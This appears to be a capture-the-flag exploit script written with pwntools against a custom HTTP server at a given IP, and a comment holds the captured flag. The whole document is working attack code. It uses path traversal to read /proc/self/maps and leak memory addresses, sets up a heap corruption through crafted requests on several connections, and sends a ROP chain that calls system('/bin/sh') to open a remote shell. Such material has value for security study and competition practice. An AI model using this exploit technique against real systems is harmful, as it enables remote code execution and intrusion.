from pwn import *

# $ cat flag_09f1df36b8402c05962f693e42c76152
# rwctf{rAge_Against_th3_dy1ng_0f_the_1ight}

host = '54.176.255.241'

p = remote(host, 54321)

p.recvuntil('//')
p.recvuntil(':')
port = int(p.recv(timeout=0.1))
print('remote port', port)

def make_conn():
    return remote(host, port)

# reg
user = 's'
pwd = 's'

c0 = make_conn()
c0.send('''GET /register?name=%s&passwd=%s&re_passwd=%s HTTP/1.1\r\n\r\n''' % (user, pwd, pwd))
c0.recvall()
c0.close()

comment_size = 0x300 - 1
content_size = comment_size + 0x100
obj_size = 0x2020 - 1
large_content_size = 0x2020 * 2 + 0x10
url = '/index.html'.rjust(comment_size, '/')
url += '?' + 'x' * 0x100

cx = make_conn()
c1 = make_conn()
c2 = make_conn()
c3 = make_conn()
c4 = make_conn()
c5 = make_conn()
c6 = make_conn()
c10 = make_conn()

req1 = '''GET /submit HTTP/1.1\r\n'''
req1 += '''Cookie: name=%s;pass=%s;\r\n''' % (user, pwd)
req1 += '''Content-Length: %d\r\n\r\n''' % (content_size)
req1 += ('word=' + 'A' * comment_size + '&').ljust(content_size, '\x00')

c2.send('''GET /submit HTTP/1.1\r\n''')
c2.send('''Cookie: name=%s;pass=%s;\r\n''' % (user, pwd))

c5.send('''GET /submit HTTP/1.1\r\n''')
c5.send('''Cookie: name=%s;pass=%s;\r\n''' % (user, pwd))

c6.send('''GET /submit HTTP/1.1\r\n''')
c6.send('''Cookie: name=%s;pass=%s;\r\n''' % (user, pwd))

c10.send('''GET /submit HTTP/1.1\r\n''')
c10.send('''Cookie: name=%s;pass=%s;\r\n''' % (user, pwd))

# allocate comment
raw_input('c1')
c1.send(req1)
raw_input('c2')
c2.send('''Content-Length: %d\r\n\r\n''' % (content_size))
raw_input('c3')
c3.send('''GET %s HTTP/1.1\r\n''' % url)
c3.send('''Cookie: name=%s;pass=%s;\r\n''' % (user, pwd))
raw_input('c5')
c5.send('''Content-Length: %d\r\n\r\n''' % (large_content_size))
raw_input('c2+')
path = '/../../../../../proc/self/maps'.rjust(comment_size, '/')
c2.send(('word=' + path + '&').ljust(content_size, '\x00'))
raw_input('c3+')
c3.send('\r\n')
c3.recvuntil('\r\n\r\n')
maps = c3.recvall()
c3.close()
text_base = 0
libc_base = 0
heap_base = 0
for line in maps.split(b'\n')[::-1]:
    if line == b'': continue
    addr = int(line.split(b'-')[0], 16)
    if b'libc-2' in line:
        libc_base = addr
    elif b'[heap]' in line:
        heap_base = addr
    elif b'rhttp' in line:
        text_base = addr
print(hex(text_base))
print(hex(heap_base))
print(hex(libc_base))
raw_input('c5+')
c5.send(('word=' + 'A' * obj_size + '&').ljust(large_content_size, '\x00'))
raw_input('c6')
c6.send('''Content-Length: %d\r\n\r\n''' % (large_content_size))
raw_input('c7')
c7 = make_conn()
# c8 = make_conn()
# c7's HttpParser is current user comment
raw_input('c10')
ptr_7 = text_base + 0x12c8
ptr_8 = text_base + 0x70
orig_io = heap_base + 0x51ab0
parser_addr = heap_base + 0x91e10
rsp = heap_base + 0x4b908
print(hex(rsp))
parser = p64(orig_io)
parser = parser.ljust(0x2010, b'\x00') + p64(rsp - 1) + p64(rsp - 1)
c10.send('''Content-Length: %d\r\n\r\n''' % (obj_size + 1))
raw_input('c10+')
c10.send(parser[:-1])
raw_input('cx')
cx.send('X')
raw_input('c7')
c7.send('7')
raw_input('c7+')
pop_rdi = text_base + 0x1f503
bin_sh = libc_base + 0x1b75aa
system = libc_base + 0x55410
rop = b''.join(map(p64, [pop_rdi + 1, pop_rdi, bin_sh, system]))
c7.send(rop)
raw_input('cx+')
cx.send('X')

p.interactive()
